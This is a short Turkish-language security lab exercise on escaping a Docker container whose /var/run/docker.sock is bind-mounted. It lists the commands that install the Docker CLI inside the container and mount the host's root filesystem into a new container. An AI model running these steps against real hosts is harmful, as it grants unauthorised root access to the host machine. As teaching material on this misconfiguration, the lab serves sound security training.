# Lab 02: Docker Socket Mount ile Host Kaçışı (Container Escape)

## Amaç

Uygulama container'ına `/var/run/docker.sock` dosyasının bağlanmasının (bind-mount), container içinde yetkisi kısıtlı olsa dahi saldırgana host makinenin tüm kök dosya sistemini (`/`) root olarak nasıl teslim ettiğini simüle etmek.

## Adımlar

1. Soketi bağlı container'ı başlat:

```bash
   docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine:latest sh
```

Docker CLI yükle ve host'taki container'ları listele:

```bash
apk add --no-cache docker-cli
docker ps
```

Host'un kök diskini yeni container'a bağlayarak kaçışı tamamla:

```bash
docker run --rm -it -v /:/host alpine:latest sh
ls -la /host
```
